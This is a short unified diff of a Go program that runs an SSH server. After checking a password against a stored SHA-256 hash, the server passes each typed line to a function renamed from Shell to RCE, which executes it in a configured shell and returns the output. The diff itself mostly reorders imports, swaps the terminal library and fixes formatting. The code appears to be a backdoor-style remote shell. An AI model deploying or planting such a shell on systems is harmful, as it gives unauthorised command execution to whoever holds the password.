@@ -1,18 +1,18 @@
 package main
 
 import (
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha256"
+	"crypto/x509"
+	"encoding/pem"
+	"errors"
 	"fmt"
 	"log"
 	"net"
-	"errors"
-	"crypto/sha256"
-	"crypto/rand"
-	"crypto/rsa"
-	"crypto/x509"
-	"encoding/pem"
 
 	"golang.org/x/crypto/ssh"
-	"golang.org/x/crypto/ssh/terminal"
+	"golang.org/x/term"
 )
 
 var hash string
@@ -68,19 +68,19 @@ func SSHServer(config Config) {
 		if err != nil {
 			continue
 		}
-		
-		term := terminal.NewTerminal(channel, "> ")
+
+		terminal := term.NewTerminal(channel, "> ")
 
 		go func() {
 			defer channel.Close()
 			for {
-				cmd, err := term.ReadLine()
+				cmd, err := terminal.ReadLine()
 				if err != nil {
 					break
 				}
 
-				output := Shell(config.Shell, []byte(cmd))
-				term.Write(output)
+				output := RCE(config.Shell, []byte(cmd))
+				terminal.Write(output)
 			}
 		}()
 	}
@@ -112,9 +112,9 @@ func encodePrivateKeyToPEM(privateKey *rsa.PrivateKey) []byte {
 }
 
 func passwordCallback(conn ssh.ConnMetadata, password []byte) (*ssh.Permissions, error) {
-	if fmt.Sprintf("%x",sha256.Sum256(password)) == hash {
+	if fmt.Sprintf("%x", sha256.Sum256(password)) == hash {
 		return nil, nil
 	}
 
-	return nil, errors.New("Auth Failed")
+	return nil, errors.New("auth failed")
 }
